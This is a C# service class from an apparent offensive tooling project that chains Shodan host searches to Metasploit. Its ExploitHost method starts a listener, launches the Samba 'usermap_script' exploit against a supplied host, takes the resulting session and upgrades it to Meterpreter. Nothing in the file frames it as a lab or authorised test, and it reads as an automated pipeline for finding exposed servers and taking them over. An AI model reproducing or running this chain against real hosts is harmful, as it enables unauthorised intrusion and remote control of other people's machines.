﻿using System.Threading.Tasks;
using Lacey.Alexa.Common.Metasploit.Extensions;
using Lacey.Alexa.Common.Metasploit.Providers;
using Lacey.Alexa.Common.Shodan.Services;
using Lacey.Medusa.Google.Api.Services;
using Microsoft.Extensions.Logging;

namespace Lacey.Alexa.Explorer.Services.Services.Concrete
{
    public sealed class ExplorerService : IExplorerService
    {
        private readonly ILogger _logger;

        private readonly IMetasploitProvider _metasploit;

        private readonly IGoogleProvider _google;

        private readonly IShodanLoginService _shodanLogin;

        private readonly IShodanService _shodan;

        public ExplorerService(
            IMetasploitProvider metasploit,
            IGoogleProvider google,
            IShodanLoginService shodanLogin,
            IShodanService shodan,
            ILogger logger)
        {
            _metasploit = metasploit;
            _google = google;
            _shodanLogin = shodanLogin;
            _shodan = shodan;
            _logger = logger;
        }

        public async Task FindVulnerableHosts()
        {
            var result = await _google.Search("shodan");
        }

        public async Task<string[]> QueryHosts(string query)
        {
            await _shodanLogin.Login();
            if (!_shodanLogin.IsAuthenticated())
            {
                return new string[]{};
            }

            return await _shodan.GetHosts(query);
        }

        public async Task ExploitHost(string host)
        {
            await _metasploit.Login();
            if (!_metasploit.IsAuthenticated())
            {
                return;
            }

            const string exploit = "multi/samba/usermap_script";

            _logger.LogTrace("Starting listener...");
            var result = await _metasploit.MultiHandler();
            await _metasploit.Exploit(exploit, host);

            _logger.LogTrace("Obtaining session...");
            var sessionId = await _metasploit.ObtainSession(exploit, result.JobId);

            _logger.LogTrace("Upgrading session to Meterpreter...");
            var meterpreterId = await _metasploit.ObtainMeterpreter(sessionId);
            await _metasploit.Meterpreter(meterpreterId);

            _logger.LogTrace("Closing session...");
            await _metasploit.StopSession(sessionId);
        }
    }
}